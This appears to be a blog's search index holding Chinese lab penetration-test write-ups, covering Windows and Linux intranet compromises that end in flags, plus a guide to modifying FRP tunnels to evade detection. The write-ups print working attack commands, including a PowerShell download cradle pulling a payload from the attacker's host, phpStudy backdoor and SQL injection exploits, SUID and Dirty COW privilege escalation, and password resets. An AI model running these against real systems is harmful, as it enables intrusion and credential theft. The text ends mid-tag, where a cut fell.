<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实战项目四 完整的渗透测试实例</title>
      <link href="2021/08/08/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E5%9B%9B%20%E5%AE%8C%E6%95%B4%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/"/>
      <url>2021/08/08/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E5%9B%9B%20%E5%AE%8C%E6%95%B4%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="实战项目四-完整的渗透测试实例"><a href="#实战项目四-完整的渗透测试实例" class="headerlink" title="实战项目四 完整的渗透测试实例"></a>实战项目四 完整的渗透测试实例</h1><p>[TOC]</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络架构</p><ul><li>Kali：172.16.3.226</li><li>护卫神：172.16.2.133 10.10.10.135</li><li>MSSQL：10.10.10.136 10.10.1.128</li><li>目标机器：10.10.1.129</li></ul><p>目标：拿下10.10.1.1.129</p><p>绑定host</p><ul><li>172.16.2.133 <a href="http://www.cc123.com/">www.cc123.com</a></li></ul><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用threader3000快速探测开放端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threader3000</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806201301880.png" alt="image-20210806201301880"></p><p>Nmap扫描</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806201657351.png" alt="image-20210806201657351"></p><p>系统：windows</p><p>端口：</p><ul><li>21 ftp</li><li>53 dns</li><li>80 http</li><li>999 http</li><li>3389 rdp</li><li>6588 http</li></ul><h2 id="枚举虚拟主机域名"><a href="#枚举虚拟主机域名" class="headerlink" title="枚举虚拟主机域名"></a>枚举虚拟主机域名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -H &quot;host:FUZZ.cc123.com&quot; -w &#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-5000.txt --hh 689 http:&#x2F;&#x2F;172.16.2.133&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806202731805.png" alt="image-20210806202731805"></p><p>发现子域名</p><ul><li>new</li><li>www</li><li>ww2</li></ul><p>绑定host</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806203332262.png" alt="image-20210806203332262"></p><h2 id="织梦SQL注入"><a href="#织梦SQL注入" class="headerlink" title="织梦SQL注入"></a>织梦SQL注入</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806203834085.png" alt="image-20210806203834085"></p><p>使用python脚本发现跑不出来，由于时间紧迫，采用超级sql注入工具。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807014533296.png" alt="image-20210807014533296"></p><p>跑出来了，拿到somd5解密。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807020414809.png" alt="image-20210807020414809"></p><p>解密成功 获得密码 admin7788</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807020818844.png" alt="image-20210807020818844"></p><h2 id="织梦后台getshell"><a href="#织梦后台getshell" class="headerlink" title="织梦后台getshell"></a>织梦后台getshell</h2><p>使用密码登录后台，来到文件管理，上传aspx的马。因为前期踩点，发现同服务器下的6588可以解析asp，所以这里上传aspx。一般来说aspx的</p><p>权限会比php大，而且可以躲避disablefunc。所以直接使用aspx更方便。这里我们上传冰蝎的aspx马子，并进行连接。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807022708022.png" alt="image-20210807022708022"></p><h2 id="CS使用Powershell上线"><a href="#CS使用Powershell上线" class="headerlink" title="CS使用Powershell上线"></a>CS使用Powershell上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;172.16.3.226:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807203733100.png" alt="image-20210807203733100"></p><h2 id="使用CS插件烂土豆提权"><a href="#使用CS插件烂土豆提权" class="headerlink" title="使用CS插件烂土豆提权"></a>使用CS插件烂土豆提权</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807203905884.png" alt="image-20210807203905884"></p><h2 id="CS迁移进程"><a href="#CS迁移进程" class="headerlink" title="CS迁移进程"></a>CS迁移进程</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807203940452.png" alt="image-20210807203940452"></p><h2 id="Ladon探测内网存活"><a href="#Ladon探测内网存活" class="headerlink" title="Ladon探测内网存活"></a>Ladon探测内网存活</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807204009505.png" alt="image-20210807204009505"></p><p>整理一下结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ICMP: 10.10.10.12900-0C-29-04-89-C5WIN-KALKEMT3JMAVMware</span><br><span class="line">ICMP: 10.10.10.12800-0C-29-A1-E6-48WIN-JJU7KU45PN7VMware</span><br></pre></td></tr></table></figure><h2 id="IOX搭建反向socks代理隧道"><a href="#IOX搭建反向socks代理隧道" class="headerlink" title="IOX搭建反向socks代理隧道"></a>IOX搭建反向socks代理隧道</h2><p>vps执行</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807213343314.png" alt="image-20210807213343314"></p><p>肉鸡执行</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807213353234.png" alt="image-20210807213353234"></p><h2 id="Mssql命令执行"><a href="#Mssql命令执行" class="headerlink" title="Mssql命令执行"></a>Mssql命令执行</h2><p>读取web.config获取配置文件（之前用MSF的时候）</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807032051459.png" alt="image-20210807032051459"></p><ul><li>WIN-JJU7KU45PN7 就是 10.10.10.128</li></ul><p>配置如下</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807034644411.png" alt="image-20210807034644411"></p><p>使用mssql_exec执行命令</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807033511501.png" alt="image-20210807033511501"></p><p>使用mssql_exec修改administrator密码，这里虽然报错，但是命令还是可以执行的，只是编码错误。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807034505312.png" alt="image-20210807034505312"></p><h2 id="Psexec横向移动"><a href="#Psexec横向移动" class="headerlink" title="Psexec横向移动"></a>Psexec横向移动</h2><p>使用psexec横向移动</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807220722085.png" alt="image-20210807220722085"></p><p>成功获取权限</p><h2 id="Ladon探测内网存活-1"><a href="#Ladon探测内网存活-1" class="headerlink" title="Ladon探测内网存活"></a>Ladon探测内网存活</h2><p>使用ipconfig /all查看网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807221257134.png" alt="image-20210807221257134"></p><p>使用Ladon扫描</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807221340264.png" alt="image-20210807221340264"></p><p>发现目标，这里其实可以用psexec直接横向过去，这里我们使用其他的方法。</p><h2 id="Ladon扫描端口"><a href="#Ladon扫描端口" class="headerlink" title="Ladon扫描端口"></a>Ladon扫描端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 10.10.1.128 Portscan 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807221721660.png" alt="image-20210807221721660"></p><h2 id="phpstudy利用"><a href="#phpstudy利用" class="headerlink" title="phpstudy利用"></a>phpstudy利用</h2><p>cs开启socks4代理</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224000022.png" alt="image-20210807224000022"></p><p>proxychains配置代理</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224029821.png" alt="image-20210807224029821"></p><p>使用proxychains配合curl利用phpstudy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -H &quot;Accept-Charset: $(echo &#39;system(&quot;ipconfig&quot;);&#39; | base64)&quot; -H &#39;Accept-Encoding: gzip,deflate&#39; 10.10.1.128</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224141089.png" alt="image-20210807224141089"></p><p>直接修改密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -H &quot;Accept-Charset: $(echo &#39;system(&quot;net user administrator admin!123&quot;);&#39; | base64)&quot; -H &#39;Accept-Encoding: gzip,deflate&#39; 10.10.1.128</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224450310.png" alt="image-20210807224450310"></p><h2 id="PSexec横向移动拿下目标"><a href="#PSexec横向移动拿下目标" class="headerlink" title="PSexec横向移动拿下目标"></a>PSexec横向移动拿下目标</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224409724.png" alt="image-20210807224409724"></p><p>成功拿下</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224555943.png" alt="image-20210807224555943"></p><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210807224757191.png" alt="image-20210807224757191"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实战项目五 linux内网完整渗透测试</title>
      <link href="2021/08/08/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E4%BA%94%20linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/08/08/%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E4%BA%94%20linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="实战项目五-linux内网完整渗透测试"><a href="#实战项目五-linux内网完整渗透测试" class="headerlink" title="实战项目五 linux内网完整渗透测试"></a>实战项目五 linux内网完整渗透测试</h1><p>[TOC]</p><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><p>Kali ：192.168.0.128</p><p>Ubuntu：192.168.0.122 10.10.10.145</p><p>Centos：10.10.10.144</p><p>绑定host</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194226646.png" alt="image-20210805194226646"></p><h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2 端口扫描"></a>2 端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p21,80,888,3306,8888 -sV -sC -T4 -Pn -oA www.ddd4.com www.ddd4.com</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194407543.png" alt="image-20210805194407543"></p><p>开放 21 80 888 3306 8888</p><p>21 ftp</p><p>80 http</p><p>3306 mysql</p><p>8888 bt</p><h2 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3 目录扫描"></a>3 目录扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://www.ddd4.com/ --full-url -t 50 -o dir.txt --exclude-sizes=12kb,261b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805194833021.png" alt="image-20210805194833021"></p><p>/admini 管理后台</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195343915.png" alt="image-20210805195343915"></p><p>/phpinfo.php 获取到网站绝对路径</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195424816.png" alt="image-20210805195424816"></p><h2 id="4-CMS漏洞查找"><a href="#4-CMS漏洞查找" class="headerlink" title="4 CMS漏洞查找"></a>4 CMS漏洞查找</h2><p>通过网站得到历史漏洞</p><p><a href="https://www.cnblogs.com/xiaozi/p/8723430.html">https://www.cnblogs.com/xiaozi/p/8723430.html</a></p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805195623255.png" alt="image-20210805195623255"></p><p>获得一处sql注入漏洞</p><h2 id="5-SQLmap利用SQL注入漏洞"><a href="#5-SQLmap利用SQL注入漏洞" class="headerlink" title="5 SQLmap利用SQL注入漏洞"></a>5 SQLmap利用SQL注入漏洞</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search/?keyword=123&quot; --tamper=chardoubleencode -D www_ddd4_com -T doc_user -C &quot;username,pwd&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805200035158.png" alt="image-20210805200035158"></p><p>密码无法解密，无法登录后台。</p><h2 id="6-SSRF读取文件"><a href="#6-SSRF读取文件" class="headerlink" title="6 SSRF读取文件"></a>6 SSRF读取文件</h2><p>这里暗月师傅的利用刚开始没有看明白，后来反应过来是一处ssrf。这里利用的Mysql 客户端的一个特性，构造了恶意服务器，进一步利用漏洞。漏洞的场景也比较特殊，发生在Mysql连接上，是一个很有趣的SSRF。 <a href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805201230947.png" alt="image-20210805201230947"></p><p>代码分析：由于变量全部可控且未经过任何过滤，第七行中的mysql_connect可以连接远程mysql服务器，第十一行查询mysql数据库的所有数据库，将结果进行处理赋值给data变量，通过in_array进行查找。</p><p>由于<strong>服务端可以在任何查询语句后回复文件传输请求</strong>，所以我们就可以指定客户端读取本地文件并给我们了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805203435541.png" alt="image-20210805203435541"></p><p>curl发起请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.128&amp;action=chkdb</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210805203535560.png" alt="image-20210805203535560"></p><p>查看mysq.log文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mysql.log</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210805203625087.png" alt="image-20210805203625087"></p><p>读取数据库配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mysql.log</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033550823.png" alt="image-20210806033550823"></p><p>user：www_ddd4_com password:x4ix6ZrM7b8nFYHn</p><h2 id="7-登录mysql替换登录密码"><a href="#7-登录mysql替换登录密码" class="headerlink" title="7 登录mysql替换登录密码"></a>7 登录mysql替换登录密码</h2><p>通过本地搭建获得加密后的admin密码，我们将我们的密码直接替换过去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.122 -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033811194.png" alt="image-20210806033811194"></p><p>替换登录密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update doc_user set pwd&#x3D;&#39;33e2q1yc3d033e22aesyc2140aec3l850c3a99s21232f297uj57a5a7438n4a0ex4a801yc3d0&#39; where id&#x3D;1;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806033847968.png" alt="image-20210806033847968"></p><p>成功登录后台</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034240341.png" alt="image-20210806034240341"></p><h2 id="8-模板文件getshell"><a href="#8-模板文件getshell" class="headerlink" title="8 模板文件getshell"></a>8 模板文件getshell</h2><p>登录后台，一眼看见模板文件，直觉告诉我他可以getshell。不出所料，可以修改php文件，我们直接写入一句话进行连接。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034413589.png" alt="image-20210806034413589"></p><p>使用Antsword连接失败，切换中国菜刀进行连接。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034507529.png" alt="image-20210806034507529"></p><h2 id="9-bypass-disablefunc"><a href="#9-bypass-disablefunc" class="headerlink" title="9 bypass_disablefunc"></a>9 bypass_disablefunc</h2><p>使用菜刀执行命令，发现失败了！查看phpinfo，发现disablefunc禁用多个函数</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806034859585.png" alt="image-20210806034859585"></p><p>使用 <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> 进行bypass。上传bypass_disablefunc_x64.so 和 bypass_disablefunc.php。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ddd4.com&#x2F;bypass_disablefunc.php?cmd&#x3D;ifconfig&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;www&#x2F;wwwroot&#x2F;www.ddd4.com&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040404111.png" alt="image-20210806040404111"></p><p>成功bypass</p><h2 id="10-MSF反弹shell"><a href="#10-MSF反弹shell" class="headerlink" title="10 MSF反弹shell"></a>10 MSF反弹shell</h2><p>使用exploit/multi/script/web_delivery 进行反弹shell，设置target和 LHOST 以及 payload即可。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040554905.png" alt="image-20210806040554905"></p><p>将Msf给的命令url编码之后，执行命令。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040644559.png" alt="image-20210806040644559"></p><p>成功反弹shell</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040706367.png" alt="image-20210806040706367"></p><h2 id="11-上传PEAS进行信息收集"><a href="#11-上传PEAS进行信息收集" class="headerlink" title="11 上传PEAS进行信息收集"></a>11 上传PEAS进行信息收集</h2><p>PEAS：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806040804510.png" alt="image-20210806040804510"></p><p>发现find命令具有suid特权</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042323522.png" alt="image-20210806042323522"></p><p>进入用户目录发现bt密码与flag.txt</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042403617.png" alt="image-20210806042403617"></p><h2 id="12-使用find命令进行suid提权"><a href="#12-使用find命令进行suid提权" class="headerlink" title="12 使用find命令进行suid提权"></a>12 使用find命令进行suid提权</h2><p>进入 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 查看find命令的suid提权</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042515219.png" alt="image-20210806042515219"></p><p>使用find命令提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec &#x2F;bin&#x2F;sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806042914311.png" alt="image-20210806042914311"></p><p>使用MSF以root权限反弹shell</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043046702.png" alt="image-20210806043046702"></p><p>getuid获取当前用户</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043345926.png" alt="image-20210806043345926"></p><h2 id="13-获取flag"><a href="#13-获取flag" class="headerlink" title="13 获取flag"></a>13 获取flag</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806053220573.png" alt="image-20210806053220573"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806053238894.png" alt="image-20210806053238894"></p><h2 id="14-MSF加载路由跨网段渗透"><a href="#14-MSF加载路由跨网段渗透" class="headerlink" title="14 MSF加载路由跨网段渗透"></a>14 MSF加载路由跨网段渗透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043620543.png" alt="image-20210806043620543"></p><p>发现另外一台机器</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806043814491.png" alt="image-20210806043814491"></p><p>修改host文件</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045647258.png" alt="image-20210806045647258"></p><h2 id="15-MSF创建socks代理"><a href="#15-MSF创建socks代理" class="headerlink" title="15 MSF创建socks代理"></a>15 MSF创建socks代理</h2><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045429261.png" alt="image-20210806045429261"></p><p>修改proxychains配置文件</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045520553.png" alt="image-20210806045520553"></p><p>使用firefox访问</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806045725108.png" alt="image-20210806045725108"></p><h2 id="16-Nmap扫描端口"><a href="#16-Nmap扫描端口" class="headerlink" title="16 Nmap扫描端口"></a>16 Nmap扫描端口</h2><p>首先使用threader快速扫描开放端口</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806050732190.png" alt="image-20210806050732190"></p><p>使用Nmap针对性探测端口信息</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806050758416.png" alt="image-20210806050758416"></p><h2 id="17-emlog插件getshell"><a href="#17-emlog插件getshell" class="headerlink" title="17 emlog插件getshell"></a>17 emlog插件getshell</h2><p>使用弱口令登录后台，制作包含后门的插件包上传。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806065951674.png" alt="image-20210806065951674"></p><p>成功getshell</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070020361.png" alt="image-20210806070020361"></p><h2 id="18-使用脏牛提权"><a href="#18-使用脏牛提权" class="headerlink" title="18 使用脏牛提权"></a>18 使用脏牛提权</h2><p>使用AntSword设置socks5代理</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070847207.png" alt="image-20210806070847207"></p><p>查看linux版本以及当前用户</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070916054.png" alt="image-20210806070916054"></p><p>搜索脏牛exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux&#x2F;local&#x2F;40839.c</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806070958737.png" alt="image-20210806070958737"></p><p>上传exp编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071304912.png" alt="image-20210806071304912"></p><p>使用chmod添加exp可执行权限，并运行exp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x dirty</span><br><span class="line">.&#x2F;dirty 123456</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071420505.png" alt="image-20210806071420505"></p><p>user：fireafart pass：123456</p><h2 id="19-获取flag"><a href="#19-获取flag" class="headerlink" title="19 获取flag"></a>19 获取flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh firefart@10.10.10.144</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210806071540533.png" alt="image-20210806071540533"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之FRP改造</title>
      <link href="2021/06/12/FRP%E6%94%B9%E9%80%A0/"/>
      <url>2021/06/12/FRP%E6%94%B9%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透之FRP改造"><a href="#内网渗透之FRP改造" class="headerlink" title="内网渗透之FRP改造"></a>内网渗透之FRP改造</h1><p>本文主要围绕流量特征 配置文件 文件体积对frpc进行改造，使用frp尽可能将frp改造成贴合上一篇文章我们的二层与三层网络环境。</p><p>实验版本：<a href="https://github.com/fatedier/frp/releases/tag/v0.37.0">https://github.com/fatedier/frp/releases/tag/v0.37.0</a></p><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p>通过配置文件加密压缩数据，达到去除流量特征的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.20.131</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">token &#x3D; 123456</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br><span class="line">protocol &#x3D; websocket</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1      </span><br><span class="line">local_port &#x3D; 3389</span><br><span class="line">remote_port &#x3D; 7001</span><br></pre></td></tr></table></figure><ul><li>使用tls： tls_enable = true </li><li>压缩数据： use_compression = true。</li><li>使用websocket通信： protocol = websocket</li></ul><p>使用加密前</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611172040503.png" alt="image-20210611172040503"></p><p>使用加密后</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210611171940122.png" alt="image-20210611171940122"></p><p>为了端口复用，所以建立TLS链接的时候,第一个字节为0x17，数据包长度为243。我们对其进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;pkg&#x2F;util&#x2F;net&#x2F;tls.go</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612155355033.png" alt="image-20210612155355033"></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>由于frp需要配置文件落地，而且配置文件以明文的形式存放，会暴露我们的信息，故对其进行修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;pkg&#x2F;config&#x2F;value.go</span><br></pre></td></tr></table></figure><p>第一处修改，注释掉无用的包，添加encoding/hex包。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612155601090.png" alt="image-20210612155601090"></p><p>第二处，添加hex解码。</p><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612155634689.png" alt="image-20210612155634689"></p><h2 id="文件体积"><a href="#文件体积" class="headerlink" title="文件体积"></a>文件体积</h2><p>通过前面的修改，我们需要重新使用golang编译源码。先设置一下代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;goproxy&#x2F;,direct</span><br></pre></td></tr></table></figure><p>开始编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -f Makefile.cross-compiles</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/magisec/images/raw/master/image-20210612160545370.png" alt="image-20210612160545370"></p><p>使用upx压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 